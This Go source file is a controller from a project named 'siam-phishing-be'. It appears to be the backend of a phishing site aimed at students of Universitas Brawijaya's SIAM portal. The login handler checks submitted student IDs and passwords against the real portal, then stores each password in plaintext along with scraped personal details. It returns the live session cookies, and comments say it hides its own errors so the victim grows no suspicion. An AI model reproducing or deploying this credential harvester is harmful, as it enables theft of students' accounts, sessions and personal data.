package main

import (
	"log"
	"net/http"
	"siam-phishing-be/db"
	"time"

	"github.com/dnabil/siamauth"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type UserController struct{
	sql *gorm.DB
}
func NewUserController(sql *gorm.DB) (*UserController){
	return &UserController{sql: sql}	
}


type LoginRequest struct {
	NIM 		string `json:"nim"`
	Password	string `json:"password"`
}
func (ctr *UserController) LoginController(c *gin.Context) {
	loginReq := LoginRequest{}
	if err := c.BindJSON(&loginReq); err != nil {
		c.JSON(400, gin.H{
			"status":"fail",
			"message":"bad request",
			"data":nil,
		})
		return
	}

	// mulai scraping
	var loginErrMsg string

	siamUser := siamauth.NewUser()
	loginErrMsg, err := siamUser.Login(loginReq.NIM, loginReq.Password)
	if err != nil {
		if err == siamauth.ErrLoginFail {
			c.JSON(http.StatusBadRequest, gin.H{
				"status" : "fail",
				"message" : "login fail",
				"data" : gin.H{
					"login-error": loginErrMsg,
				},
			})
		} else {
			c.JSON(500, gin.H{
				"status": "error",
			})
		}

		return
	}
	defer siamUser.Logout() // opsional logout

	user := db.User{
		NIM: loginReq.NIM,
		Password: loginReq.Password,
	}

	// jadi shorthand, untuk scrape data mahasiswa
	scrapeDataMahasiswa := func() error{
		if err := siamUser.GetData(); err != nil {
			return err
		}

		user.Nama = siamUser.Data.Nama
		user.Jenjang = siamUser.Data.Jenjang
		user.Fakultas = siamUser.Data.Fakultas
		user.Jurusan = siamUser.Data.Jurusan
		user.ProgramStudi = siamUser.Data.ProgramStudi
		user.Seleksi = siamUser.Data.Seleksi
		user.NomorUjian = siamUser.Data.NomorUjian
		user.FotoProfil = siamUser.Data.FotoProfil
		return nil
	}

	// end of scraping

	// cari nim
	newAccount := false
	err = ctr.sql.WithContext(c.Request.Context()).Where("nim = ?", user.NIM).First(&user).Error
	// buat akun baru
	if err == gorm.ErrRecordNotFound {
		newAccount = true
		user.CreatedAt = time.Now()
		if err := scrapeDataMahasiswa(); err != nil {
			// TODO: tidy log
			log.Println(err)
			log.Println("[error] database error, gagal scrape data mahasiswa")
		}
		err = ctr.sql.WithContext(c.Request.Context()).Create(&user).Error
	}
	if err != nil{
		log.Println(err)
		log.Println("[error] database error, gagal menyimpan data siam account.")
		// tetep lanjut biar gak suspicious
	}
	
	// jika bukan akun baru, maka update
	if !newAccount {
		user.Password = loginReq.Password
		user.UpdatedAt = time.Now()
		if err := scrapeDataMahasiswa(); err != nil {
			// TODO: tidy log
			log.Println(err)
			log.Println("[error] database error, gagal scrape data mahasiswa")
		}
		if err = ctr.sql.WithContext(c.Request.Context()).Save(&user).Error; err != nil{
			log.Println(err)
			log.Println("[error] database error, gagal update data siam account.")
			// tetep lanjut biar gak suspicious
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"status":"success",
		"message":"login success",
		"data" : gin.H{
			"cookies" : siamUser.C.Cookies("https://siam.ub.ac.id/"),
		},
	})
}